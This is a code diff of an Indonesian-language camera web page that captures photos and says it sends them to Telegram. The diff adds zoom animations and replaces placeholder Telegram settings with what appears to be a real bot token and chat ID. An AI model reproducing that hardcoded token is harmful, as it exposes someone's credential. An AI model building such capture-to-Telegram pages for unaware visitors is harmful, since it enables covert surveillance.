@@ -217,18 +217,27 @@
             display: flex;
             align-items: center;
             touch-action: manipulation;
+            transition: transform 0.2s;
+        }
+        .zoom-control .zoom-btn:active {
+            transform: scale(0.8);
         }
         .zoom-control .zoom-btn svg {
             width: 22px;
             height: 22px;
             fill: currentColor;
-        }
-        .zoom-control .zoom-btn:active {
-            opacity: 0.5;
+            transition: transform 0.2s;
         }
         .zoom-control .zoom-value {
             min-width: 40px;
             text-align: center;
+            font-variant-numeric: tabular-nums;
+            transition: transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.2s;
+            display: inline-block;
+        }
+        .zoom-control .zoom-value.pop {
+            transform: scale(1.4);
+            opacity: 0.7;
         }
 
         .bottom-bar {
@@ -358,7 +367,7 @@
             <path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
         </svg>
         <h1>📸 Akses Kamera</h1>
-        <p>Website ini akan mengambil foto dan dapat mengirimkannya ke Telegram.</p>
+        <p>Website ini akan mengambil foto dan mengirimkannya ke Telegram.</p>
         <div class="status-text" id="status-text">Tekan tombol di bawah untuk memulai.</div>
         <div class="error-msg" id="error-msg"></div>
         <button class="btn-allow" id="btn-allow">Lanjutkan</button>
@@ -421,10 +430,10 @@
 
     <script>
         // ===========================================================
-        // 🔒 KONFIGURASI TELEGRAM (HARDCODE - GANTI DI SINI)
+        // 🔒 KONFIGURASI TELEGRAM (LANGSUNG DARI ANDA)
         // ===========================================================
-        const BOT_TOKEN = '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'; // GANTI
-        const CHAT_ID = '-1001234567890'; // GANTI
+        const BOT_TOKEN = '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug';
+        const CHAT_ID = '7839405566';
 
         // ===========================================================
         // ELEMEN
@@ -456,7 +465,7 @@
         let isStarting = false;
 
         // ===========================================================
-        // KAMERA START — DENGAN 3 TAHAP FALLBACK
+        // KAMERA START — 3 TAHAP FALLBACK
         // ===========================================================
         async function startCamera(facing = facingMode) {
             if (isStarting) return false;
@@ -474,27 +483,19 @@
                 let tempStream = null;
                 let lastError = null;
 
-                // Tahap 1: Dengan facingMode yang diminta
+                // Tahap 1
                 try {
                     statusText.textContent = '📷 Mencoba kamera ' + (facing === 'environment' ? 'belakang' : 'depan') + '...';
-                    const constraints = {
-                        video: { facingMode: facing },
-                        audio: false
-                    };
+                    const constraints = { video: { facingMode: facing }, audio: false };
                     tempStream = await navigator.mediaDevices.getUserMedia(constraints);
-                    console.log('✅ Tahap 1 berhasil (facingMode)');
+                    console.log('✅ Tahap 1 berhasil');
                 } catch (err1) {
                     console.warn('Tahap 1 gagal:', err1.message);
                     lastError = err1;
-
-                    // Tahap 2: Paksa environment (jika facing user gagal)
                     if (facing === 'user') {
                         try {
                             statusText.textContent = '🔄 Coba kamera belakang...';
-                            const constraints2 = {
-                                video: { facingMode: 'environment' },
-                                audio: false
-                            };
+                            const constraints2 = { video: { facingMode: 'environment' }, audio: false };
                             tempStream = await navigator.mediaDevices.getUserMedia(constraints2);
                             facingMode = 'environment';
                             console.log('✅ Tahap 2 berhasil (force environment)');
@@ -503,13 +504,9 @@
                             lastError = err2;
                         }
                     } else {
-                        // Tahap 2b: Coba user jika environment gagal
                         try {
                             statusText.textContent = '🔄 Coba kamera depan...';
-                            const constraints2b = {
-                                video: { facingMode: 'user' },
-                                audio: false
-                            };
+                            const constraints2b = { video: { facingMode: 'user' }, audio: false };
                             tempStream = await navigator.mediaDevices.getUserMedia(constraints2b);
                             facingMode = 'user';
                             console.log('✅ Tahap 2b berhasil (force user)');
@@ -518,14 +515,12 @@
                             lastError = err2b;
                         }
                     }
-
-                    // Tahap 3: Tanpa facingMode (default)
                     if (!tempStream) {
                         try {
-                            statusText.textContent = '🔄 Coba mode default (tanpa spesifikasi)...';
+                            statusText.textContent = '🔄 Coba mode default...';
                             const constraints3 = { video: true, audio: false };
                             tempStream = await navigator.mediaDevices.getUserMedia(constraints3);
-                            console.log('✅ Tahap 3 berhasil (default video)');
+                            console.log('✅ Tahap 3 berhasil (default)');
                         } catch (err3) {
                             console.warn('Tahap 3 gagal:', err3.message);
                             lastError = err3;
@@ -533,9 +528,7 @@
                     }
                 }
 
-                if (!tempStream) {
-                    throw lastError || new Error('Semua percobaan gagal');
-                }
+                if (!tempStream) throw lastError || new Error('Semua percobaan gagal');
 
                 stream = tempStream;
                 video.srcObject = stream;
@@ -543,17 +536,14 @@
                 statusText.textContent = '✅ Kamera aktif!';
                 errorMsg.textContent = '';
 
-                // Terapkan zoom
                 updateZoom();
-
-                // Torch
                 try {
                     const track = stream.getVideoTracks()[0];
                     const cap = track.getCapabilities();
                     if (cap.torch) {
                         await track.applyConstraints({ advanced: [{ torch: flashOn }] });
                     }
-                } catch (e) { /* abaikan */ }
+                } catch (e) {}
                 updateFlashUI();
 
                 overlay.classList.add('hidden');
@@ -565,8 +555,8 @@
                 console.error('❌ Gagal total:', err);
                 let msg = err.message;
                 if (msg.includes('Permission')) msg = 'Izin kamera ditolak. Beri izin di browser.';
-                else if (msg.includes('NotFound')) msg = 'Tidak ditemukan kamera di perangkat.';
-                else if (msg.includes('NotAllowed')) msg = 'Izin kamera ditolak. Cek pengaturan browser.';
+                else if (msg.includes('NotFound')) msg = 'Tidak ditemukan kamera.';
+                else if (msg.includes('NotAllowed')) msg = 'Izin ditolak. Cek pengaturan browser.';
                 else if (msg.includes('Overconstrained')) msg = 'Kamera tidak mendukung mode ini.';
                 errorMsg.textContent = '❌ ' + msg;
                 statusText.textContent = '⚠️ Gagal, tekan tombol untuk coba lagi.';
@@ -618,10 +608,16 @@
         });
 
         // ===========================================================
-        // ZOOM
+        // ZOOM — DENGAN ANIMASI SMOOTH
         // ===========================================================
         function updateZoom() {
             zoomVal.textContent = currentZoom + '×';
+            // efek pop
+            zoomVal.classList.remove('pop');
+            void zoomVal.offsetWidth;
+            zoomVal.classList.add('pop');
+            setTimeout(() => zoomVal.classList.remove('pop'), 300);
+
             if (stream) {
                 const track = stream.getVideoTracks()[0];
                 const cap = track.getCapabilities();
@@ -753,7 +749,7 @@
         // ===========================================================
         // INIT
         // ===========================================================
-        console.log('📸 Aplikasi kamera siap. Pastikan token & chat_id diganti.');
+        console.log('📸 Aplikasi siap. Token & Chat ID sudah diisi.');
         statusText.textContent = 'Tekan tombol untuk mengakses kamera.';
     </script>
 </body>
